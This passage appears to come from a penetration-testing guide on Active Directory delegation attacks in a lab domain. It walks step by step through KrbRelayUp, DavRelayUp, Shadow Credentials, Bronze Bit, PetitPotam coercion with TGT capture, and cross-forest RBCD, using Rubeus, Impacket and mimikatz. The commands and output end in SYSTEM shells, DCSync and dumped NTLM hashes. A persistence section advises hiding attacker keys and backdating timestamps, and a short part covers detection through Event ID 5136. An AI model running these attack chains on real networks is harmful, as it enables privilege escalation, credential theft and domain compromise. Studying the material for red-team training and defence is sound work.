  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  dGVzdGtleQ==

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d
```

**Step 3: S4U2Self to Get SYSTEM Access**

```powershell
PS C:\Tools> .\Rubeus.exe s4u /self /user:WS01$ /rc4:5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d /impersonateuser:Administrator /altservice:cifs/WS01.INLANEFREIGHT.LOCAL /ptt

[*] Action: S4U
[*] Building S4U2self request for: 'WS01$@INLANEFREIGHT.LOCAL'
[+] S4U2self success!
[*] Impersonating user 'Administrator' to target SPN 'cifs/WS01.INLANEFREIGHT.LOCAL'
[+] Ticket successfully imported!
```

---

### Scenario 7: RBCD via KrbRelayUp (Local Privilege Escalation — Windows Only)

**Prerequisites:**
- Domain-joined Windows workstation or server
- LDAP signing not enforced on the DC (default)
- MachineAccountQuota > 0 (default = 10)
- Local user session on the target machine

> KrbRelayUp is a "no-fix" local privilege escalation technique. It abuses the fact that a domain-joined machine's SYSTEM account can be coerced into authenticating via Kerberos to a local COM server, which then relays the authentication to LDAP to set RBCD on the local machine.
{: .prompt-danger }

**Step 1: Run KrbRelayUp Full Attack Chain**

```powershell
PS C:\Tools> .\KrbRelayUp.exe full -c -cn FAKEMACHINE$ -cp Password123! -d INLANEFREIGHT.LOCAL -dc DC01.INLANEFREIGHT.LOCAL

KrbRelayUp - Relaying you to SYSTEM

[+] Computer account "FAKEMACHINE$" added with password "Password123!"
[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relaying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:

    KrbRelayUp.exe spawn -d INLANEFREIGHT.LOCAL -cn FAKEMACHINE$ -cp Password123!

[+] TGT request successful!
[+] Ticket successfully imported!
[+] Building S4U2self
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.117.3)
[+] Sending S4U2self request to 172.16.117.3:88
[+] S4U2self success!
[+] Got a TGS for 'Administrator' to 'FAKEMACHINE$@INLANEFREIGHT.LOCAL'
[+] Impersonating user 'Administrator' to target SPN 'HOST/WS01'
[+] Building S4U2proxy request for service: 'HOST/WS01'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.117.3)
[+] Sending S4U2proxy request to domain controller 172.16.117.3:88
[+] S4U2proxy success!
[+] Ticket successfully imported!
[+] Using ticket to connect to Service Manager
[+] AcquireCredentialsHandleHook called for package N
[+] Changing to Kerberos package
[+] InitializeSecurityContextHook called for target H
[+] InitializeSecurityContext status = 0x00090312
[+] InitializeSecurityContextHook called for target H
[+] InitializeSecurityContext status = 0x00000000
[+] KrbSCM Service created
[+] KrbSCM Service started
[+] Clean-up done
```

```
Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Alternatively, running in two phases:

**Phase 1 — Relay:**

```powershell
PS C:\Tools> .\KrbRelayUp.exe relay -d INLANEFREIGHT.LOCAL -c -cn FAKEMACHINE$ -cp Password123!

KrbRelayUp - Relaying you to SYSTEM

[+] Computer account "FAKEMACHINE$" added with password "Password123!"
[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
    KrbRelayUp.exe spawn -d INLANEFREIGHT.LOCAL -cn FAKEMACHINE$ -cp Password123!
```

**Phase 2 — Spawn:**

```powershell
PS C:\Tools> .\KrbRelayUp.exe spawn -d INLANEFREIGHT.LOCAL -cn FAKEMACHINE$ -cp Password123!

KrbRelayUp - Relaying you to SYSTEM

[+] TGT request successful!
[+] Ticket successfully imported!
[+] Building S4U2self
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.117.3)
[+] Sending S4U2self request to 172.16.117.3:88
[+] S4U2self success!
[+] Got a TGS for 'Administrator' to 'FAKEMACHINE$@INLANEFREIGHT.LOCAL'
[+] Impersonating user 'Administrator' to target SPN 'HOST/WS01'
[+] Building S4U2proxy request for service: 'HOST/WS01'
[+] S4U2proxy success!
[+] Ticket successfully imported!
[+] Using ticket to connect to Service Manager
[+] KrbSCM Service created
[+] KrbSCM Service started
[+] Clean-up done
```

---

### Scenario 8: RBCD via DavRelayUp (Local Privilege Escalation — Windows Only)

**Prerequisites:**
- Domain-joined Windows workstation
- WebClient service enabled or startable
- LDAP signing not enforced (default)
- MachineAccountQuota > 0 (default)

> DavRelayUp is similar to KrbRelayUp but uses **WebDAV/HTTP-based NTLM relay** instead of Kerberos relay. It triggers the local machine to authenticate via HTTP to a local WebDAV server, then relays the NTLM authentication to LDAP on the DC.
{: .prompt-info }

**Step 1: Run DavRelayUp Full Attack**

```powershell
PS C:\Tools> .\DavRelayUp.exe -c -cn DAVRELAYUP$ -cp Password123!

DavRelayUp - Relaying you to SYSTEM via WebDAV

[+] Computer account "DAVRELAYUP$" added with password "Password123!"
[+] Starting WebDAV server on port 80
[+] Triggering machine account authentication via WebClient
[+] Got NTLM Auth from WS01$. Relaying to LDAP now...
[+] LDAP session established
[+] RBCD rights modified successfully! DAVRELAYUP$ can now impersonate users on WS01$ via S4U2Proxy
[+] Obtaining TGT for DAVRELAYUP$
[+] TGT request successful!
[+] Building S4U2self request
[+] S4U2self success!
[+] Building S4U2proxy request for service: 'HOST/WS01'
[+] S4U2proxy success!
[+] Ticket imported!
[+] Service created and started
[+] Clean-up done

Microsoft Windows [Version 10.0.19041.1320]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

### Scenario 9: KrbRelayUp with Shadow Credentials Method (No Machine Account Needed)

**Prerequisites:**
- Domain-joined Windows workstation
- LDAP signing not enforced (default)
- AD CS enabled (DC has a certificate for PKINIT)
- No need for MachineAccountQuota > 0

> This variant of KrbRelayUp uses **Shadow Credentials** instead of RBCD. It adds a Key Credential to the local machine account's `msDS-KeyCredentialLink` attribute, then uses PKINIT to obtain a TGT and S4U2Self to get a SYSTEM ticket. This bypasses the MAQ requirement entirely and also bypasses Protected Users / "sensitive and cannot be delegated" protections since it abuses S4U2Self from the machine's own TGT.
{: .prompt-tip }

**Step 1: Relay Phase — Add Shadow Credential**

```powershell
PS C:\Tools> .\KrbRelayUp.exe relay -m shadowcred -d INLANEFREIGHT.LOCAL -dc DC01.INLANEFREIGHT.LOCAL

KrbRelayUp - Relaying you to SYSTEM

[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relaying to LDAP now...
[+] LDAP session established
[+] Shadow credential added successfully to WS01$
[+] Certificate: MIIJuAIBAz...
[+] Certificate Password: Xr9K2pLm
[+] Run the spawn method:
    KrbRelayUp.exe spawn -m shadowcred -d INLANEFREIGHT.LOCAL -dc DC01.INLANEFREIGHT.LOCAL -ce MIIJuAIBAz... -cep Xr9K2pLm
```

**Step 2: Spawn Phase — Obtain TGT via PKINIT and S4U2Self**

```powershell
PS C:\Tools> .\KrbRelayUp.exe spawn -m shadowcred -d INLANEFREIGHT.LOCAL -dc DC01.INLANEFREIGHT.LOCAL -ce MIIJuAIBAz... -cep Xr9K2pLm

KrbRelayUp - Relaying you to SYSTEM

[+] Requesting TGT via PKINIT...
[+] TGT request successful!
[+] Using TGT for S4U2self
[+] Building S4U2self request for: 'WS01$@INLANEFREIGHT.LOCAL'
[+] Sending S4U2self request to 172.16.117.3:88
[+] S4U2self success!
[+] Got a TGS for 'Administrator' to 'WS01$@INLANEFREIGHT.LOCAL'
[+] Impersonating user 'Administrator' to target SPN 'HOST/WS01'
[+] Ticket successfully imported!
[+] Using ticket to connect to Service Manager
[+] KrbSCM Service created
[+] KrbSCM Service started
[+] Clean-up done

C:\Windows\system32> whoami
nt authority\system
```

---

### Scenario 10: RBCD via NTLM Relay + CVE-2020-17049 Bronze Bit (Bypass Protected Users)

**Prerequisites:**
- RBCD configured (via relay or ACL abuse)
- Know the controlled machine/service account's password hash
- Target user to impersonate is a member of `Protected Users` or has "Account is sensitive and cannot be delegated"
- DC is vulnerable to CVE-2020-17049 (unpatched, pre-December 2020) OR the service ticket encryption allows manipulation

> When the target user (e.g., Administrator) is in the Protected Users group, the S4U2Self ticket will have the Forwardable flag set to 0. While RBCD does not strictly require forwardable tickets, the KDC may still refuse the S4U2Proxy request for protected users. The Bronze Bit attack allows us to decrypt the service ticket (using the controlled account's hash), flip the Forwardable bit to 1, and re-encrypt it.
{: .prompt-danger }

#### Linux Attack Path

**Step 1: Set Up RBCD (as in previous scenarios)**

Assume RBCD has been set: `FAKEMACHINE$` can delegate to `DC01$`.

**Step 2: Request Service Ticket with -force-forwardable**

```bash
hacker@root[/root]$ getST.py -spn 'cifs/DC01.INLANEFREIGHT.LOCAL' -impersonate 'ProtectedAdmin' -force-forwardable -dc-ip 172.16.117.3 'INLANEFREIGHT.LOCAL/FAKEMACHINE$:Password123!'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Getting TGT for user
[*] Impersonating ProtectedAdmin
[*] Requesting S4U2self
[*] Forcing the service ticket to be forwardable (CVE-2020-17049)
[*] Decrypting service ticket
[*] Flipping forwardable bit from 0 to 1
[*] Re-encrypting service ticket
[*] Requesting S4U2Proxy
[*] Saving ticket in ProtectedAdmin@cifs_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
```

**Step 3: Access the Target**

```bash
hacker@root[/root]$ export KRB5CCNAME=ProtectedAdmin@cifs_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ secretsdump.py -k -no-pass DC01.INLANEFREIGHT.LOCAL
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
ProtectedAdmin:1501:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
[*] Kerberos keys grabbed
[*] Cleaning up...
```

#### Windows Attack Path

```powershell
PS C:\Tools> .\Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:7F3B1C4A2E8D5F9A0B6C3D7E1A2F4C8D /impersonateuser:ProtectedAdmin /msdsspn:cifs/DC01.INLANEFREIGHT.LOCAL /bronzebit /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.1

[*] Action: S4U

[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\FAKEMACHINE$'
[+] TGT request successful!
[*] Action: S4U
[*] Building S4U2self request for: 'FAKEMACHINE$@INLANEFREIGHT.LOCAL'
[+] S4U2self success!
[*] Got a TGS for 'ProtectedAdmin' to 'FAKEMACHINE$@INLANEFREIGHT.LOCAL'
[!] Forwardable bit is NOT set on the S4U2self ticket
[*] Applying Bronze Bit: decrypting, flipping forwardable bit, re-encrypting
[+] Bronze Bit applied successfully - ticket is now forwardable
[*] Building S4U2proxy request for service: 'cifs/DC01.INLANEFREIGHT.LOCAL'
[+] S4U2proxy success!
[+] Ticket successfully imported!
```

> The Bronze Bit attack succeeds because the Forwardable flag is encrypted with the service account's long-term key (not in the signed PAC). Since we know the key, we can modify and re-encrypt the ticket.
{: .prompt-tip }

---

### Scenario 11: RBCD Chained with Unconstrained Delegation (TGT Capture)

**Prerequisites:**
- A host configured for **Unconstrained Delegation** has been compromised
- Ability to coerce authentication from a DC or high-value target
- RBCD used to gain initial access to the unconstrained delegation host

> This is a chained attack: First, use RBCD to compromise a host that has Unconstrained Delegation configured. Then, use that host to capture TGTs from coerced authentications. This can lead directly to domain compromise via DCSync.
{: .prompt-warning }

**Step 1: Identify Unconstrained Delegation Hosts**

```bash
hacker@root[/root]$ nxc ldap 172.16.117.3 -u 'svc_web' -p 'Password123' --trusted-for-delegation
SMB         172.16.117.3    445    DC01             [*] Windows Server 2019 Build 17763 x64
LDAP        172.16.117.3    389    DC01             [+] INLANEFREIGHT.LOCAL\svc_web:Password123
LDAP        172.16.117.3    389    DC01             [*] Trusted for Delegation:
LDAP        172.16.117.3    389    DC01             DC01$
LDAP        172.16.117.3    389    DC01             SRV-UNCONSTRAINED$
```

**Step 2: Compromise SRV-UNCONSTRAINED via RBCD (using any previous scenario)**

Use Scenario 1 or 2 to set RBCD and gain SYSTEM access on `SRV-UNCONSTRAINED`.

**Step 3: Set Up Rubeus to Monitor for TGTs**

```powershell
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.1

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 5 seconds for new TGTs
```

**Step 4: Coerce the DC to Authenticate to the Unconstrained Delegation Host**

From the attacker machine:

```bash
hacker@root[/root]$ python3 PetitPotam.py -u 'svc_web' -p 'Password123' -d INLANEFREIGHT.LOCAL SRV-UNCONSTRAINED.INLANEFREIGHT.LOCAL 172.16.117.3

Trying pipe lsarpc
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[+] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Step 5: Rubeus Captures the DC's TGT**

```powershell
[*] 3/23/2026 5:55:00 PM UTC - Found new TGT:

  User                  :  DC01$@INLANEFREIGHT.LOCAL
  StartTime             :  3/23/2026 5:55:00 PM
  EndTime               :  3/24/2026 3:55:00 AM
  RenewTill             :  3/30/2026 5:55:00 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFxj...
```

**Step 6: Use the DC's TGT for DCSync**

```powershell
PS C:\Tools> .\Rubeus.exe ptt /ticket:doIFxj...
[+] Ticket successfully imported!

PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator" exit

  .#####.   mimikatz 2.2.0 (x64)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **
SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 3/15/2026 10:00:00 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b
```

---

### Scenario 12: Cross-Domain RBCD Attack

**Prerequisites:**
- A two-way forest trust between Forest A (`INLANEFREIGHT.LOCAL`) and Forest B (`PARTNER.LOCAL`)
- MachineAccountQuota > 0 in the target domain (Forest B)
- Write access to a computer object in the target domain (or ability to relay)
- SID filtering must allow the machine SID across the trust

> Cross-domain RBCD attacks exploit the fact that trust relationships allow Kerberos authentication across boundaries. If you can create a machine account in the target forest and set RBCD on a target computer, the S4U2Proxy request will be honored across the trust.
{: .prompt-warning }

**Step 1: Create a Machine Account in the Target Forest**

```bash
hacker@root[/root]$ addcomputer.py -computer-name 'XFOREST$' -computer-pass 'CrossDomainPass1!' -dc-ip 10.10.20.3 'PARTNER.LOCAL/compromised_user:CompromisedPass!'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Successfully added machine account XFOREST$ with password CrossDomainPass1!.
```

**Step 2: Set RBCD on the Target Computer in the Target Forest**

Assume we have GenericWrite over `TARGETSRV$` in PARTNER.LOCAL:

```bash
hacker@root[/root]$ rbcd.py -delegate-from 'XFOREST$' -delegate-to 'TARGETSRV$' -dc-ip 10.10.20.3 -action write 'PARTNER.LOCAL/compromised_user:CompromisedPass!'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] XFOREST$ can now impersonate users on TARGETSRV$ via S4U2Proxy
```

**Step 3: Request Cross-Domain Service Ticket**

```bash
hacker@root[/root]$ getST.py -spn 'cifs/TARGETSRV.PARTNER.LOCAL' -impersonate 'Administrator' -dc-ip 10.10.20.3 'PARTNER.LOCAL/XFOREST$:CrossDomainPass1!'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_TARGETSRV.PARTNER.LOCAL@PARTNER.LOCAL.ccache
```

**Step 4: Access Target Across Trust Boundary**

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_TARGETSRV.PARTNER.LOCAL@PARTNER.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass -target-ip 10.10.20.50 TARGETSRV.PARTNER.LOCAL
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Requesting shares on TARGETSRV.PARTNER.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file qTxWmNkR.exe
[*] Opening SVCManager on TARGETSRV.PARTNER.LOCAL.....
[*] Creating service xJpL on TARGETSRV.PARTNER.LOCAL.....
[*] Starting service xJpL.....
[!] Press help for extra shell commands

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
TARGETSRV
```

> Cross-forest RBCD requires that the trust configuration does not filter out the machine account's SID via SID filtering. In forest trusts with strict SID filtering (quarantine), this attack may fail. Same-forest trusts (parent-child, tree-root) do not have SID filtering by default, making this attack straightforward.
{: .prompt-info }

---

## Shadow Credentials — Deep Dive

### What is msDS-KeyCredentialLink?

The `msDS-KeyCredentialLink` attribute was introduced with Windows Server 2016 as part of the **Windows Hello for Business (WHfB)** and **Key Trust** authentication model. It allows storing raw public keys (in a `KeyCredential` structure) associated with a user or computer object. When a principal wants to authenticate, it can use PKINIT with the corresponding private key.

The attribute stores a `KEYCREDENTIALLINK_BLOB` structure containing:

| Field | Description |
|---|---|
| **Version** | Structure version |
| **KeyID** | Unique identifier (SHA-256 hash of the public key) |
| **KeyUsage** | NGC (Next Generation Credential), FIDO, etc. |
| **Source** | AzureAD or AD |
| **DeviceID** | GUID identifying the device |
| **CustomKeyInfo** | Key strength and flags |
| **KeyApproximateLastLogonTimeStamp** | Last logon using this key |
| **RawKeyMaterial** | The actual RSA public key parameters |

### How PKINIT Works with Key Trust

PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) allows a principal to authenticate to the KDC using an X509 certificate or a raw key pair instead of a password:

1. The client creates a timestamp, signs it with the private key, and sends it along with the certificate in the `AS-REQ`
2. The KDC validates the certificate against the `msDS-KeyCredentialLink` attribute (for Key Trust) or against a CA (for Certificate Trust)
3. If valid, the KDC issues a TGT

This mechanism is used by:
- **Windows Hello for Business (Key Trust)** — Keys stored in `msDS-KeyCredentialLink`
- **Certificate-based authentication** — Certificates issued by AD CS
- **Smart card authentication** — Using certificates on smart cards

### Windows Hello for Business Background

WHfB was designed to replace passwords with strong two-factor authentication:

1. During enrollment, the device generates an RSA key pair
2. The public key is stored in the user's `msDS-KeyCredentialLink` attribute
3. The private key is stored on the device (TPM-protected if available)
4. At login, the device proves knowledge of the private key via PKINIT

The **attack** exploits this by adding an attacker-controlled key pair to the target's `msDS-KeyCredentialLink`, then using the corresponding private key to authenticate as the target.

### pyWhisker Usage (Linux)

**Add a Shadow Credential:**

```bash
hacker@root[/root]$ python3 pywhisker.py -d 'INLANEFREIGHT.LOCAL' -u 'svc_web' -p 'Password123' --target 'DC01$' --action 'add' --filename dc01_shadow --dc-ip 172.16.117.3
[*] Searching for the target account
[*] Target user found: CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: d4e5f6a7-b8c9-0123-def0-123456789abc
[*] Updating the msDS-KeyCredentialLink attribute of DC01$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: dc01_shadow.pfx
[+] Must be used with password: KhJ3mNpQ7rXw
[+] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

**List Shadow Credentials:**

```bash
hacker@root[/root]$ python3 pywhisker.py -d 'INLANEFREIGHT.LOCAL' -u 'svc_web' -p 'Password123' --target 'DC01$' --action 'list' --dc-ip 172.16.117.3
[*] Searching for the target account
[*] Target user found: CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
[*] Listing deviced for DC01$:
[*]     DeviceID: d4e5f6a7-b8c9-0123-def0-123456789abc | Creation Time: 2026-03-23 17:30:00
```

**Remove a Shadow Credential:**

```bash
hacker@root[/root]$ python3 pywhisker.py -d 'INLANEFREIGHT.LOCAL' -u 'svc_web' -p 'Password123' --target 'DC01$' --action 'remove' --device-id 'd4e5f6a7-b8c9-0123-def0-123456789abc' --dc-ip 172.16.117.3
[*] Searching for the target account
[*] Target user found: CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
[*] Found KeyCredential with DeviceID d4e5f6a7-b8c9-0123-def0-123456789abc
[*] Removing KeyCredential with DeviceID d4e5f6a7-b8c9-0123-def0-123456789abc
[+] Successfully removed KeyCredential
```

### Whisker Usage (Windows)

**Add a Shadow Credential:**

```powershell
PS C:\Tools> .\Whisker.exe add /target:DC01$ /domain:INLANEFREIGHT.LOCAL /dc:DC01.INLANEFREIGHT.LOCAL
[*] Searching for the target account
[*] Target user found: CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e5f6a7b8-c9d0-1234-ef01-23456789abcd
[*] Updating the msDS-KeyCredentialLink attribute of DC01$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Certificate: MIIJuAIBAz...
[*] Password: pQ7rXwKhJ3mN

Rubeus.exe asktgt /user:DC01$ /certificate:MIIJuAIBAz... /password:"pQ7rXwKhJ3mN" /domain:INLANEFREIGHT.LOCAL /dc:DC01.INLANEFREIGHT.LOCAL /getcredentials /show
```

**List Shadow Credentials:**

```powershell
PS C:\Tools> .\Whisker.exe list /target:DC01$ /domain:INLANEFREIGHT.LOCAL /dc:DC01.INLANEFREIGHT.LOCAL
[*] Searching for the target account
[*] Target user found: CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
[*] Listing devices for DC01$:
[*]     DeviceID: e5f6a7b8-c9d0-1234-ef01-23456789abcd | Creation Time: 3/23/2026 5:30:00 PM
```

**Remove a Shadow Credential:**

```powershell
PS C:\Tools> .\Whisker.exe remove /target:DC01$ /deviceid:e5f6a7b8-c9d0-1234-ef01-23456789abcd /domain:INLANEFREIGHT.LOCAL /dc:DC01.INLANEFREIGHT.LOCAL
[*] Searching for the target account
[*] Target user found: CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
[*] Found KeyCredential with DeviceID e5f6a7b8-c9d0-1234-ef01-23456789abcd
[*] Removing KeyCredential
[+] Successfully removed KeyCredential
```

### Combining Shadow Credentials with NTLM Relay

Shadow Credentials can be set via NTLM relay just like RBCD:

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -t ldaps://172.16.117.3 --shadow-credentials --shadow-target 'DC01$'
```

When a DC's authentication is relayed, the tool writes a KeyCredential to the DC's own `msDS-KeyCredentialLink` attribute. Since **computer objects can edit their own `msDS-KeyCredentialLink`**, this works.

### Persistence via Shadow Credentials

Shadow Credentials provide an excellent persistence mechanism:

1. Add a KeyCredential to a high-value account (computer or user)
2. The credential persists even if the account's password is changed
3. You can authenticate any time using the private key via PKINIT

To maintain stealth:
- Use PEM format instead of PFX to avoid on-disk certificate files
- Set the `KeyApproximateLastLogonTimeStamp` to a past date
- Store the private key encrypted in your C2 infrastructure

### Detection (Event ID 5136)

When the `msDS-KeyCredentialLink` attribute is modified, Windows generates **Event ID 5136** (A directory service object was modified) in the **Directory Service Changes** audit log:

```
Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Event ID:      5136
Task Category: Directory Service Changes
Level:         Information
Description:   A directory service object was modified.

Subject:
    Security ID:     INLANEFREIGHT\svc_web
    Account Name:    svc_web
    Account Domain:  INLANEFREIGHT
    Logon ID:        0x3E7

Directory Service:
    Object DN:       CN=WS01,OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL
    Object GUID:     {a1b2c3d4-e5f6-7890-abcd-ef1234567890}
    Object Class:    computer

Attribute:
    LDAP Display Name: msDS-KeyCredentialLink
    Syntax (OID):      2.5.5.10
    Value:             B:828:000200...
```

> Monitor for Event ID 5136 where the LDAP Display Name is `msDS-KeyCredentialLink`. Legitimate modifications are rare in most environments and should be investigated.
{: .prompt-tip }

---

## Complete Tool Reference Tables

### Linux Tools

| Tool | Purpose | Key Flags | Repository |
|---|---|---|---|
| `getST.py` (Impacket) | Request S4U2Self + S4U2Proxy service tickets | `-spn`, `-impersonate`, `-force-forwardable`, `-u2u`, `-self` | [Impacket](https://github.com/fortra/impacket) |
| `rbcd.py` (Impacket) | Read/write `msDS-AllowedToActOnBehalfOfOtherIdentity` | `-delegate-from`, `-delegate-to`, `-action read/write/remove/flush` | [Impacket](https://github.com/fortra/impacket) |
| `addcomputer.py` (Impacket) | Create new machine accounts in AD | `-computer-name`, `-computer-pass` | [Impacket](https://github.com/fortra/impacket) |
| `ntlmrelayx.py` (Impacket) | NTLM relay framework | `--delegate-access`, `--escalate-user`, `--shadow-credentials`, `--remove-mic` | [Impacket](https://github.com/fortra/impacket) |
| `psexec.py` (Impacket) | Remote command execution via SMB | `-k`, `-no-pass` (for Kerberos auth) | [Impacket](https://github.com/fortra/impacket) |
| `secretsdump.py` (Impacket) | Extract credentials (DCSync, SAM, LSA) | `-k`, `-no-pass`, `-just-dc-ntlm` | [Impacket](https://github.com/fortra/impacket) |
| `getTGT.py` (Impacket) | Request TGT via AS-REQ | `-hashes`, `-aesKey` | [Impacket](https://github.com/fortra/impacket) |
| `describeTicket.py` (Impacket) | Inspect Kerberos ticket contents | Shows session key, flags, timestamps | [Impacket](https://github.com/fortra/impacket) |
| `changepasswd.py` (Impacket) | Change user password remotely | `-newhashes`, `-hashes` | [Impacket](https://github.com/fortra/impacket) |
| `pywhisker` | Manage `msDS-KeyCredentialLink` (Shadow Credentials) | `--action add/remove/list/clear`, `--filename`, `--export PEM/PFX` | [pywhisker](https://github.com/ShutdownRepo/pywhisker) |
| `gettgtpkinit.py` (PKINITtools) | Request TGT via PKINIT (certificate auth) | `-cert-pfx`, `-pfx-pass`, `-cert-pem`, `-key-pem` | [PKINITtools](https://github.com/dirkjanm/PKINITtools) |
| `getnthash.py` (PKINITtools) | Recover NT hash from PKINIT TGT via U2U | `-key` (AS-REP encryption key) | [PKINITtools](https://github.com/dirkjanm/PKINITtools) |
| `printerbug.py` | Trigger Print Spooler coercion (SpoolSample) | Target and listener IPs | [krbrelayx](https://github.com/dirkjanm/krbrelayx) |
| `PetitPotam.py` | Trigger EFS coercion (MS-EFSRPC) | `-u`, `-p`, target and listener IPs | [PetitPotam](https://github.com/topotam/PetitPotam) |
| `Coercer` | Multi-method coercion framework | `-u`, `-p`, `-l`, `-t`, `--filter-protocol-name` | [Coercer](https://github.com/p0dalirius/Coercer) |
| `bloodyAD` | Versatile AD manipulation tool | `get object`, `add computer`, `set rbcd`, `set shadowCredentials` | [bloodyAD](https://github.com/CravateRouge/bloodyAD) |
| `ldeep` | LDAP enumeration and exploitation | `search`, `add_to_group`, `modify` | [ldeep](https://github.com/franc-music/ldeep) |
| `netexec (nxc)` | Swiss army knife for AD network assessment | `-M maq`, `-M webdav`, `-M ldap-checker`, `--gen-relay-list` | [NetExec](https://github.com/Pennyw0rth/NetExec) |

### Windows Tools

| Tool | Purpose | Key Flags | Repository |
|---|---|---|---|
| `Rubeus` | Kerberos abuse toolkit | `s4u`, `asktgt`, `hash`, `monitor`, `ptt`, `/bronzebit`, `/self` | [Rubeus](https://github.com/GhostPack/Rubeus) |
